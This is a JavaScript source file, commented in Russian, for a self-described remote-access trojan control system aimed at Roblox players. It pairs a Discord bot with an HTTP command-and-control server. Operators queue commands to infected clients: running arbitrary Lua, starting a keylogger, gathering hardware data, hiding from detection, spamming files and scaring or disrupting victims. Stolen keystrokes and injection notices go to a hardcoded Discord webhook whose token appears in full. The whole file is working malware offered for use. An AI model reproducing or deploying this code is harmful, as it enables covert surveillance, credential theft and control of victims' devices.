const http = require('http');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
const PORT = process.env.PORT || 10000;

// Логирование конфигурации
console.log('🔧 Конфигурация сервера:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);

// ========== ИНИЦИАЛИЗАЦИЯ DISCORD БОТА ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    // Функция отправки команды на RAT сервер
    async function sendCommand(command, args = [], target = null) {
        try {
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command, args, target })
            });
            console.log(`📨 Команда ${command} отправлена`);
            return response.ok;
        } catch (error) {
            console.error(`❌ Ошибка отправки команды ${command}:`, error.message);
            return false;
        }
    }

    // Получение списка онлайн пользователей
    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) {
                return await response.json();
            }
            return { users: [], count: 0 };
        } catch (error) {
            console.error('❌ Ошибка получения пользователей:', error.message);
            return { users: [], count: 0 };
        }
    }

    // Обработчик событий Discord бота
    discordClient.on('ready', () => {
        console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
        console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
        
        discordClient.user.setActivity('RAT Control Panel v2.8', { type: 'WATCHING' });
    });

    // Обработка сообщений (старые команды через префикс /)
    discordClient.on('messageCreate', async message => {
        if (message.author.bot) return;
        
        if (message.content.startsWith('/')) {
            const args = message.content.slice(1).split(' ');
            const command = args.shift().toLowerCase();
            
            // Словарь команд для красивого отображения
            const commandHandlers = {
                test: async () => {
                    if (await sendCommand("popup", ["Тест от Discord бота! ✅"])) {
                        message.reply('✅ Тестовая команда отправлена!');
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                print: async () => {
                    if (await sendCommand("print")) {
                        const embed = new EmbedBuilder()
                            .setTitle('📡 Проверка связи')
                            .setDescription('Команда проверки связи отправлена')
                            .setColor(0x00ff00);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                users: async () => {
                    const data = await getOnlineUsers();
                    
                    if (data.count === 0) {
                        const embed = new EmbedBuilder()
                            .setTitle('👥 Онлайн пользователи')
                            .setDescription('❌ Нет активных пользователей')
                            .setColor(0xff0000);
                        message.reply({ embeds: [embed] });
                        return;
                    }
                    
                    const embed = new EmbedBuilder()
                        .setTitle('👥 Онлайн пользователи')
                        .setDescription(`**Всего пользователей:** ${data.count}`)
                        .setColor(0x00ff00)
                        .setTimestamp();
                    
                    // Группируем по играм
                    const games = {};
                    data.users.forEach(user => {
                        const game = user.place || 'Unknown';
                        if (!games[game]) games[game] = [];
                        games[game].push(user);
                    });
                    
                    for (const [game, users] of Object.entries(games)) {
                        const userList = users.slice(0, 5).map(u => 
                            `\`${u.player}\` (${u.executor || 'Unknown'})`
                        ).join('\n');
                        
                        embed.addFields({
                            name: `🎮 ${game} (${users.length})`,
                            value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
                            inline: false
                        });
                    }
                    
                    message.reply({ embeds: [embed] });
                },
                
                status: async () => {
                    try {
                        const response = await fetch(`${SERVER_URL}/status`);
                        if (response.ok) {
                            const data = await response.json();
                            
                            const embed = new EmbedBuilder()
                                .setTitle('📊 Статус системы')
                                .setDescription('Текущее состояние RAT Control System')
                                .setColor(0x7289da)
                                .addFields(
                                    { name: '🤖 Бот', value: '🟢 Активен', inline: true },
                                    { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                                    { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                                    { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
                                    { name: '🛠️ Техническая информация', value: `• Версия: \`2.8.0\`\n• Сервер: \`${SERVER_URL}\`\n• Обновление: \`15 секунд\``, inline: false }
                                )
                                .setTimestamp();
                            
                            message.reply({ embeds: [embed] });
                        }
                    } catch (error) {
                        message.reply('❌ Ошибка получения статуса');
                    }
                },
                
                kick: async () => {
                    const reason = args.join(' ') || 'Нарушение правил';
                    if (await sendCommand("kick", [reason])) {
                        const embed = new EmbedBuilder()
                            .setTitle('🦶 Игроки кикнуты')
                            .setDescription(`**Причина:** ${reason}`)
                            .setColor(0xe74c3c);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                freeze: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 60);
                    
                    if (await sendCommand("freeze", [seconds])) {
                        const embed = new EmbedBuilder()
                            .setTitle('❄️ Заморозка активирована')
                            .setDescription(`Игроки заморожены на \`${seconds}\` секунд`)
                            .setColor(0x3498db);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                void: async () => {
                    if (await sendCommand("void")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🌀 Телепорт в бездну')
                            .setDescription('Игроки телепортированы в бездну')
                            .setColor(0x2c3e50);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                spin: async () => {
                    if (await sendCommand("spin")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🔄 Вращение активировано')
                            .setDescription('Игроки начинают вращаться')
                            .setColor(0xf39c12);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                fling: async () => {
                    if (await sendCommand("fling")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🚀 Подбрасывание')
                            .setDescription('Игроки подброшены в воздух')
                            .setColor(0xe67e22);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                sit: async () => {
                    if (await sendCommand("sit")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🪑 Изменение позы')
                            .setDescription('Игроки меняют позу (сидят/встают)')
                            .setColor(0x27ae60);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                dance: async () => {
                    if (await sendCommand("dance")) {
                        const embed = new EmbedBuilder()
                            .setTitle('💃 Танец активирован')
                            .setDescription('Игроки начинают танцевать')
                            .setColor(0xe91e63);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                mute: async () => {
                    if (await sendCommand("mute")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🔇 Звуки отключены')
                            .setDescription('Все звуки в игре выключены')
                            .setColor(0x95a5a6);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                unmute: async () => {
                    if (await sendCommand("unmute")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🔊 Звуки включены')
                            .setDescription('Все звуки в игре включены')
                            .setColor(0x2ecc71);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                blur: async () => {
                    let blurSeconds = parseInt(args[0]) || 5;
                    blurSeconds = Math.min(blurSeconds, 30);
                    
                    if (await sendCommand("blur", [blurSeconds])) {
                        const embed = new EmbedBuilder()
                            .setTitle('🔵 Размытие экрана')
                            .setDescription(`Экран размыт на \`${blurSeconds}\` секунд`)
                            .setColor(0x3498db);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                jumpscare: async () => {
                    let scareType = parseInt(args[0]) || 1;
                    const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                    const name = scareNames[scareType] || scareNames[1];
                    
                    if (await sendCommand("jumpscare", [scareType])) {
                        const embed = new EmbedBuilder()
                            .setTitle(`👻 Скример ${name} запущен!`)
                            .setDescription('**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n\n⚠️ Приготовься к ужасу!')
                            .setColor(0xff0000)
                            .addFields(
                                { name: '🎭 Тип', value: name, inline: true },
                                { name: '🕒 Длительность', value: '~10 секунд', inline: true }
                            )
                            .setFooter({ text: 'Полноэкранный режим активирован' });
                        
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                message: async () => {
                    const text = args.join(' ');
                    if (!text) {
                        message.reply('❌ Укажите текст сообщения');
                        return;
                    }
                    
                    if (text.length > 100) {
                        message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
                        return;
                    }
                    
                    if (await sendCommand("popup", [text])) {
                        const embed = new EmbedBuilder()
                            .setTitle('📩 Сообщение отправлено')
                            .setDescription(`\`\`\`${text}\`\`\``)
                            .setColor(0x3498db);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки сообщения');
                    }
                },
                
                execute: async () => {
                    const code = args.join(' ');
                    if (!code) {
                        message.reply('❌ Укажите код для выполнения');
                        return;
                    }
                    
                    if (code.length > 500) {
                        message.reply('❌ Код слишком длинный (макс. 500 символов)');
                        return;
                    }
                    
                    if (await sendCommand("execute", [code])) {
                        const embed = new EmbedBuilder()
                            .setTitle('🔧 Код отправлен')
                            .setDescription(`\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``)
                            .setColor(0xf39c12);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                fakeerror: async () => {
                    const errorText = args.join(' ') || 'Системная ошибка';
                    const displayText = errorText.length > 80 ? errorText.substring(0, 77) + '...' : errorText;
                    
                    if (await sendCommand("fakeerror", [displayText])) {
                        const embed = new EmbedBuilder()
                            .setTitle('⚠ Фейковая ошибка')
                            .setDescription(`Сообщение: \`${displayText}\``)
                            .setColor(0xe74c3c);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                keylog: async () => {
                    if (await sendCommand("keylog")) {
                        const embed = new EmbedBuilder()
                            .setTitle('⌨️ Кейлоггер активирован')
                            .setDescription('Кейлоггер собирает данные. Логи будут отправляться каждые 5 минут.')
                            .setColor(0xe74c3c);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                stopkeylog: async () => {
                    if (await sendCommand("stopkeylog")) {
                        const embed = new EmbedBuilder()
                            .setTitle('🛑 Кейлоггер деактивирован')
                            .setDescription('Сбор данных остановлен. Последние логи отправлены.')
                            .setColor(0x2ecc71);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                hardware: async () => {
                    if (await sendCommand("hardware")) {
                        const embed = new EmbedBuilder()
                            .setTitle('✅ Запрос отправлен')
                            .setDescription('Данные об оборудовании запрошены')
                            .setColor(0x00ff00);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                hide: async () => {
                    if (await sendCommand("hide")) {
                        const embed = new EmbedBuilder()
                            .setTitle('✅ Скрипт скрыт')
                            .setDescription('Скрипт успешно скрыт от систем обнаружения')
                            .setColor(0x00ff00);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                memory: async () => {
                    let fileCount = parseInt(args[0]) || 100;
                    fileCount = Math.min(fileCount, 1000);
                    
                    if (await sendCommand("memory_spam", [fileCount])) {
                        const embed = new EmbedBuilder()
                            .setTitle('✅ Memory Spam запущен')
                            .setDescription(`Создание ${fileCount} файлов начато`)
                            .setColor(0xff6b6b);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                gallery: async () => {
                    let imageCount = parseInt(args[0]) || 10;
                    imageCount = Math.min(imageCount, 50);
                    
                    if (await sendCommand("gallery_spam", [imageCount])) {
                        const embed = new EmbedBuilder()
                            .setTitle('✅ Gallery Spam запущен')
                            .setDescription(`Скачивание ${imageCount} видео начато\n**Источник:** GitHub`)
                            .setColor(0x74b9ff)
                            .addFields(
                                { name: '📁 Файлы', value: 'Сохраняются в Download/Workspace', inline: false },
                                { name: '🎥 Контент', value: 'Видео с GitHub', inline: true }
                            );
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                chat: async () => {
                    if (await sendCommand("chat")) {
                        const embed = new EmbedBuilder()
                            .setTitle('💬 Управление чатом')
                            .setDescription('Команда переключения чата отправлена')
                            .setColor(0x9b59b6);
                        message.reply({ embeds: [embed] });
                    } else {
                        message.reply('❌ Ошибка отправки команды');
                    }
                },
                
                help: async () => {
                    const helpEmbed = new EmbedBuilder()
                        .setTitle('🤖 RAT Control Panel v2.8')
                        .setDescription('Полный список доступных команд для управления клиентами')
                        .setColor(0x7289da)
                        .addFields(
                            { name: '🧪 Основные команды', value: '`/test` - Тестовая команда\n`/print` - Проверка связи', inline: false },
                            { name: '💬 Чат команды', value: '`/chat` - Активировать/деактивировать чат\n`/message <текст>` - Отправить всплывающее сообщение', inline: false },
                            { name: '👤 Управление игроком', value: '`/kick <причина>` - Кикнуть игроков\n`/freeze <секунды>` - Заморозить игроков\n`/void` - Телепорт в бездну\n`/spin` - Крутить игроков\n`/fling` - Подбросить игроков\n`/sit` - Сидеть/встать\n`/dance` - Танцевать', inline: false },
                            { name: '🔊 Аудио/Видео', value: '`/mute` - Выключить звуки\n`/unmute` - Включить звуки\n`/blur <секунды>` - Размытие экрана', inline: false },
                            { name: '👻 Скримеры', value: '`/jumpscare <тип>` - Запустить скример (1-Джефф, 2-Соник)', inline: false },
                            { name: '👥 Пользователи', value: '`/users` - Показать онлайн пользователей\n`/status` - Статус системы', inline: false },
                            { name: '⚙️ Системные команды', value: '`/execute <код>` - Выполнить Lua-код\n`/fakeerror <текст>` - Показать фейковую ошибку\n`/keylog` - Активировать кейлоггер\n`/stopkeylog` - Остановить кейлоггер', inline: false },
                            { name: '🖥️ Оборудование', value: '`/hardware` - Данные об оборудовании\n`/hide` - Скрыть скрипт', inline: false },
                            { name: '💥 Spam команды', value: '`/memory <кол-во>` - Спам файлами в памяти\n`/gallery <кол-во>` - Спам видео с GitHub', inline: false }
                        )
                        .setFooter({ text: `Сервер: ${SERVER_URL} | Всего команд: 25` });
                    
                    message.reply({ embeds: [helpEmbed] });
                }
            };

            // Выполняем команду если она существует
            if (commandHandlers[command]) {
                try {
                    await commandHandlers[command]();
                } catch (error) {
                    console.error(`❌ Ошибка выполнения команды ${command}:`, error);
                    message.reply(`❌ Ошибка выполнения команды: ${error.message}`);
                }
            } else {
                message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    });

    // Запуск Discord бота
    discordClient.login(DISCORD_TOKEN).then(() => {
        console.log('✅ Discord бот успешно авторизован');
    }).catch(error => {
        console.error('❌ Ошибка авторизации Discord бота:', error.message);
        console.log('💡 Проверьте:');
        console.log('1. Токен в Environment Variables на Render');
        console.log('2. Права бота на https://discord.com/developers');
        console.log('3. Что бот приглашен на сервер');
    });
} else {
    console.log('⚠️ DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
    console.log('💡 Добавьте DISCORD_TOKEN в Environment Variables на Render для работы бота');
}

// ========== СЕРВЕРНАЯ ЛОГИКА ==========
let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

function cleanupInactiveUsers() {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) {
            global.onlineUsers.delete(key);
        }
    }
}

setInterval(cleanupInactiveUsers, 30 * 1000);

async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: "RAT Control System" }
                }]
            })
        });
    } catch (error) {
        console.error('Discord webhook error:', error.message);
    }
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Получение команд для клиента
    if (req.method === 'GET' && req.url === '/data') {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const player = url.searchParams.get('player');
        
        // Ищем команды для этого игрока или для всех
        const commandsForPlayer = [];
        const remainingCommands = [];
        
        for (const cmd of commandQueue) {
            if (cmd.target === null || cmd.target === player) {
                commandsForPlayer.push(cmd);
            } else {
                remainingCommands.push(cmd);
            }
        }
        
        commandQueue = remainingCommands;
        
        if (commandsForPlayer.length > 0) {
            const cmd = commandsForPlayer[0];
            res.end(JSON.stringify({
                command: cmd.command,
                args: cmd.args
            }));
        } else {
            res.end(JSON.stringify({
                command: "",
                args: []
            }));
        }
        return;
    }
    
    // Отправка команды от бота
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { command, args, target } = JSON.parse(body);
                
                commandQueue.push({
                    command: command,
                    args: args || [],
                    target: target || null
                });
                
                // Логируем важные события
                if (command === "inject_notify") {
                    await sendDiscordMessage(
                        "🔌 Новый инжект!",
                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}\n**Инжектор:** ${args[3]}\n**Устройство:** ${args[4]}`,
                        0x00ff00
                    );
                }
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Получение списка онлайн пользователей
    if (req.method === 'GET' && req.url === '/users') {
        cleanupInactiveUsers();
        const users = Array.from(global.onlineUsers.values());
        res.end(JSON.stringify({
            users: users,
            count: users.length
        }));
        return;
    }
    
    // Обновление информации о пользователе
    if (req.method === 'POST' && req.url === '/users') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, place, executor, device } = JSON.parse(body);
                global.onlineUsers.set(player, {
                    player: player,
                    place: place,
                    executor: executor,
                    device: device || "Unknown",
                    lastSeen: Date.now()
                });
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Скриншоты
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/screenshot') {
        res.end(JSON.stringify({ 
            image: lastScreenshot || null 
        }));
        return;
    }
    
    // Кейлоггер
    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                await sendDiscordMessage(
                    "⌨️ Кейлоггер",
                    `\`\`\`${logs.slice(0, 1900)}\`\`\``,
                    0xe74c3c
                );
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Статус сервера
    if (req.method === 'GET' && req.url === '/status') {
        cleanupInactiveUsers();
        res.end(JSON.stringify({
            status: "online",
            online_users: global.onlineUsers.size,
            pending_commands: commandQueue.length,
            discord_bot: discordClient && discordClient.user ? {
                username: discordClient.user.tag,
                status: "online"
            } : { status: "disabled" }
        }));
        return;
    }
    
    // Информация о системе
    if (req.method === 'GET' && req.url === '/system_info') {
        res.end(JSON.stringify({
            name: "RAT Control System",
            version: "2.8.0",
            description: "Продвинутая система удаленного управления Roblox клиентами",
            server: SERVER_URL,
            endpoints: [
                { path: "/data", method: "GET", description: "Получение команд для клиента" },
                { path: "/command", method: "POST", description: "Отправка команд от бота" },
                { path: "/users", method: "GET", description: "Список онлайн пользователей" },
                { path: "/status", method: "GET", description: "Статус сервера" },
                { path: "/screenshot", method: "GET", description: "Получение скриншота" },
                { path: "/system_info", method: "GET", description: "Информация о системе" }
            ],
            features: [
                "Управление игроком (кик, заморозка, телепорт)",
                "Скример система (Джефф Килер, Соник.exe)",
                "Чат система с сообщениями",
                "Мониторинг устройств",
                "Кейлоггер",
                "Spam инструменты"
            ],
            discord_bot: discordClient && discordClient.user ? {
                username: discordClient.user.tag,
                status: "online",
                commands_count: 25
            } : { status: "disabled_no_token" }
        }));
        return;
    }
    
    // Корневой путь
    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({
            message: "RAT Control System v2.8",
            endpoints: [
                "/data?player=NAME - Получение команд",
                "/users - Онлайн пользователи",
                "/status - Статус системы",
                "/system_info - Информация о проекте"
            ],
            documentation: "Используйте /help в Discord для управления"
        }));
        return;
    }
    
    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found", path: req.url }));
});

// Запуск HTTP сервера
server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log('📡 Эндпоинты:');
    console.log('• GET  /data?player=NAME - Получение команд для клиента');
    console.log('• POST /command - Отправка команд от бота');
    console.log('• GET  /users - Список онлайн пользователей');
    console.log('• GET  /status - Статус сервера');
    console.log('• GET  /system_info - Информация о системе');
    console.log('');
    
    if (DISCORD_TOKEN) {
        console.log('💬 Discord команды готовы:');
        console.log('• /help - Список всех команд');
        console.log('• /users - Онлайн пользователи');
        console.log('• /jumpscare [тип] - Скримеры');
        console.log('• Всего 25 команд - смотри /help');
    } else {
        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
    }
});

// Обработка завершения работы
process.on('SIGTERM', () => {
    console.log('🛑 Получен SIGTERM. Завершаю работу...');
    if (discordClient) {
        discordClient.destroy();
    }
    server.close(() => {
        console.log('✅ Сервер остановлен');
        process.exit(0);
    });
});
